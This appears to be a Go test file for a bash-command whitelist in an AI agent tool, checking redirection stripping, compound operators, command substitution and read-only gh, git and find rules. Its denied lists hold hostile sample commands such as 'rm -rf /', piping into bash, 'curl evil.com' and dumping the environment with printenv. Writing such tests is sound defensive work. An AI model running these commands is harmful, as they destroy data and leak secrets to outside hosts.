package config

import (
	"strings"
	"testing"
)

// pushCfg builds a config whose only whitelist entries are the end-anchored
// git-push patterns, mirroring what users configure for branch protection. It
// exercises the interaction between redirection stripping and "$"-anchored
// patterns (a redirect suffix must not defeat the anchor).
func pushCfg() *Config {
	return &Config{
		Tools: ToolsConfig{
			Enabled: true,
			Bash: BashToolConfig{
				Enabled: true,
				Whitelist: ToolWhitelistConfig{
					Patterns: []string{
						"^git push( --set-upstream)?( origin)? (feature|fix)/[a-zA-Z0-9/_.-]+$",
					},
				},
			},
		},
	}
}

func TestIsBashCommandWhitelisted_RedirectStripping(t *testing.T) {
	cfg := DefaultConfig()

	allowed := []string{
		"gh api repos/o/r/issues 2>&1",
		"gh issue list 2>/dev/null",
		"gh issue list >/dev/null 2>&1",
		"gh issue list 2>&1 >/dev/null",
		"gh pr view 5 2>&1",
		"gh api user --paginate 2>&1",
		"gh issue list &>/dev/null",
		"gh issue list 1>/dev/null",
		"git status 2>&1",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q to be whitelisted after stripping redirections", cmd)
		}
	}

	denied := []string{
		"gh api repos/o/r/issues -X POST 2>&1",
		"rm -rf / 2>&1",
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q NOT to be whitelisted", cmd)
		}
	}

	if stripBenignTrailingRedirections("gh issue list > /etc/passwd") != "gh issue list > /etc/passwd" {
		t.Error("a redirect to a real file must not be stripped as benign")
	}
}

func TestIsBashCommandWhitelisted_RedirectWithAnchoredPattern(t *testing.T) {
	cfg := pushCfg()

	if !cfg.IsBashCommandWhitelisted("git push origin feature/x 2>&1") {
		t.Error("expected redirect-suffixed push to a feature branch to be whitelisted")
	}
	if cfg.IsBashCommandWhitelisted("git push origin main 2>&1") {
		t.Error("expected push to main to stay blocked even with a redirect suffix")
	}
}

func TestIsBashCommandWhitelisted_CompoundOperators(t *testing.T) {
	cfg := DefaultConfig()

	allowed := []string{
		"gh issue view 5 && gh issue comment 5 --body hi",
		"gh issue create --title x --body y || echo failed",
		"echo a | head",
		"gh issue list && echo done",
		"gh api repos/o/r/issues 2>&1 && echo ok",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected compound %q to be whitelisted (every segment is allowed)", cmd)
		}
	}

	denied := []string{
		"gh issue list && rm -rf /",
		"gh issue list; rm -rf /",
		"gh issue list | bash",
		"echo a && curl evil.com",
		"gh issue list &",
		"gh issue list & rm -rf /",
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected compound %q NOT to be whitelisted (a segment is not allowed)", cmd)
		}
	}
}

func TestIsBashCommandWhitelisted_CommandSubstitution(t *testing.T) {
	cfg := DefaultConfig()

	denied := []string{
		"echo $(rm -rf /)",
		"echo `whoami`",
		`gh issue create --title "$(date)"`,
		"cat <(curl evil.com)",
		"echo >(tee leak)",
		`echo "leak: $(printenv)"`,
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q NOT to be whitelisted (contains command substitution)", cmd)
		}
	}

	allowed := []string{
		"echo '$(rm -rf /)'",
		"gh issue create --body 'use $(x) verbatim'",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q to be whitelisted (substitution syntax is single-quoted/literal)", cmd)
		}
	}
}

func TestIsBashCommandWhitelisted_QuotedOperators(t *testing.T) {
	cfg := DefaultConfig()

	allowed := []string{
		`gh issue create --title "a && b"`,
		`gh issue comment 5 --body "x | y ; z"`,
		`gh issue create --title "fix: a || b"`,
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q to be whitelisted (operators are inside quotes)", cmd)
		}
	}
}

func TestIsBashCommandWhitelisted_MalformedAndEmpty(t *testing.T) {
	cfg := DefaultConfig()

	denied := []string{
		"",
		"   ",
		"&&",
		";",
		"| head",
		"2>&1",
		`echo "unterminated`,
		"echo 'unterminated",
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected malformed/empty %q NOT to be whitelisted", cmd)
		}
	}
}

func TestIsBashCommandWhitelisted_GhSearch(t *testing.T) {
	cfg := DefaultConfig()

	allowed := []string{
		"gh search issues --repo o/r vercel",
		`gh search code "func main"`,
		"gh search prs --author me",
		"gh search repos topic:go",
		"gh search commits fix 2>&1",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q to be whitelisted", cmd)
		}
	}

	if cfg.IsBashCommandWhitelisted("gh search invalidsub foo") {
		t.Error("expected unknown gh search subcommand NOT to be whitelisted")
	}
}

func TestIsBashCommandWhitelisted_GhApiJq(t *testing.T) {
	cfg := DefaultConfig()

	allowed := []string{
		`gh api repos/o/r --jq '.[] | .id'`,
		`gh api repos/o/r --jq '.[] | select(.draft==false) | .title'`,
		`gh api repos/o/r/issues -q '.[] | length'`,
		`gh api repos/o/r/pulls --jq '.[] | {number, title}'`,
		`gh api repos/o/r --jq ".[] | .name"`,
		"gh api repos/o/r/issues --jq .[].title",
		"gh api user --paginate",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected read-only %q to be whitelisted", cmd)
		}
	}

	denied := []string{
		"gh api repos/o/r/issues -X POST",
		"gh api repos/o/r/issues --method POST",
		"gh api -X DELETE repos/o/r",
		"gh api repos/o/r -f title=x",
		`gh api repos/o/r/secrets -X POST -f value=$TOKEN`,
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected mutating %q NOT to be whitelisted", cmd)
		}
	}
}

func TestIsBashCommandWhitelisted_GhApiGraphql(t *testing.T) {
	cfg := DefaultConfig()

	allowed := []string{
		"gh api graphql -f query='mutation { updateIssueIssueType }'",
		`gh api graphql -f query="query { repository }"`,
		"gh api graphql -f query=xxx -f id=123",
		"gh api graphql --paginate -f query=xxx",
		"gh api graphql",
		"gh api graphql -X POST",
		"gh api graphql 2>&1",
		"gh api graphql -f query=xxx && echo done",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q to be whitelisted", cmd)
		}
	}

	denied := []string{
		"gh api repos/o/r -f title=x",
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q NOT to be whitelisted", cmd)
		}
	}
}

func TestIsBashCommandWhitelisted_GhProject(t *testing.T) {
	cfg := DefaultConfig()

	allowed := []string{
		"gh project item-add 7 --owner inference-gateway --url https://github.com/inference-gateway/cli/issues/123",
		"gh project item-edit 7 --item-id PVTI_xxx --field Status --value Todo",
		"gh project item-list 7 --owner inference-gateway",
		"gh project field-list 7 --owner inference-gateway",
		"gh project view 7 --owner inference-gateway",
		"gh project list --owner inference-gateway",
		"gh project item-edit 7 --item-id PVTI_xxx --field Status --value Done 2>&1",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q to be whitelisted", cmd)
		}
	}

	denied := []string{
		"gh project delete 7",
		"gh project item-delete 7 --item-id PVTI_xxx",
		"gh project unknown-subcommand",
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q NOT to be whitelisted", cmd)
		}
	}
}

func TestIsBashCommandWhitelisted_FindActions(t *testing.T) {
	cfg := DefaultConfig()

	allowed := []string{
		"find .",
		"find . -name '*.go'",
		"find . -type f -name '*.md'",
		"find . -name '*.txt' | wc -l",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected read-only %q to be whitelisted", cmd)
		}
	}

	denied := []string{
		"find . -delete",
		"find . -name secrets.yaml -delete",
		`find . -exec echo {} \;`,
		`find /etc -name '*.conf' -exec grep -l SECRET {} \;`,
		`find . -execdir rm {} \;`,
		`find . -ok rm {} \;`,
		"find . -fls /tmp/listing",
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected dangerous find %q NOT to be whitelisted", cmd)
		}
	}
}

func TestIsBashCommandWhitelisted_GitStatusFlags(t *testing.T) {
	cfg := DefaultConfig()
	allowed := []string{
		"git status",
		"git status --porcelain",
		"git status -s",
		"git status --porcelain --untracked-files=all",
		"git status -sb 2>&1",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected read-only %q to be whitelisted", cmd)
		}
	}
}

func TestStripBenignTrailingRedirections(t *testing.T) {
	tests := []struct {
		in   string
		want string
	}{
		{"gh api repos/o/r 2>&1", "gh api repos/o/r"},
		{"gh issue list 2>/dev/null", "gh issue list"},
		{"gh issue list >/dev/null 2>&1", "gh issue list"},
		{"gh issue list 2>&1 >/dev/null", "gh issue list"},
		{"gh issue list &>/dev/null", "gh issue list"},
		{"echo hi >&2", "echo hi"},
		{"echo hi 2>&-", "echo hi"},
		{"echo hi", "echo hi"},
		{"echo /dev/null", "echo /dev/null"},
		{"gh issue list > out.txt", "gh issue list > out.txt"},
		{"2>&1", ""},
	}
	for _, tt := range tests {
		if got := stripBenignTrailingRedirections(tt.in); got != tt.want {
			t.Errorf("stripBenignTrailingRedirections(%q) = %q, want %q", tt.in, got, tt.want)
		}
	}
}

func TestSplitBashSegments(t *testing.T) {
	tests := []struct {
		in   string
		want []string
		ok   bool
	}{
		{"gh issue list", []string{"gh issue list"}, true},
		{"a && b", []string{"a", "b"}, true},
		{"a || b", []string{"a", "b"}, true},
		{"a | b", []string{"a", "b"}, true},
		{"a |& b", []string{"a", "b"}, true},
		{"a ; b", []string{"a", "b"}, true},
		{"a & b", []string{"a", "b"}, true},
		{"gh api x 2>&1 && echo y", []string{"gh api x 2>&1", "echo y"}, true},
		{"echo hi >&2", []string{"echo hi >&2"}, true},
		{"cmd &> /dev/null", []string{"cmd &> /dev/null"}, true},
		{`echo "a && b"`, []string{`echo "a && b"`}, true},
		{"echo 'a | b'", []string{"echo 'a | b'"}, true},
		{`echo "unterminated`, nil, false},
		{"echo 'unterminated", nil, false},
	}
	for _, tt := range tests {
		got, ok := splitBashSegments(tt.in)
		if ok != tt.ok {
			t.Errorf("splitBashSegments(%q) ok = %v, want %v", tt.in, ok, tt.ok)
			continue
		}
		if !ok {
			continue
		}
		trimmed := make([]string, len(got))
		for i, s := range got {
			trimmed[i] = strings.TrimSpace(s)
		}
		if strings.Join(trimmed, "\x00") != strings.Join(tt.want, "\x00") {
			t.Errorf("splitBashSegments(%q) = %v, want %v", tt.in, trimmed, tt.want)
		}
	}
}

func TestContainsCommandSubstitution(t *testing.T) {
	yes := []string{
		"echo $(x)",
		"echo `x`",
		"cat <(x)",
		"echo >(x)",
		`echo "$(x)"`,
		"echo \"`x`\"",
	}
	for _, cmd := range yes {
		if !containsCommandSubstitution(cmd) {
			t.Errorf("containsCommandSubstitution(%q) = false, want true", cmd)
		}
	}

	no := []string{
		"echo '$(x)'",
		"echo '`x`'",
		"gh api repos/o/r --jq '.a | .b'",
		"echo $HOME",
		"echo ${HOME}",
		"gh issue create --title x --body y",
	}
	for _, cmd := range no {
		if containsCommandSubstitution(cmd) {
			t.Errorf("containsCommandSubstitution(%q) = true, want false", cmd)
		}
	}
}
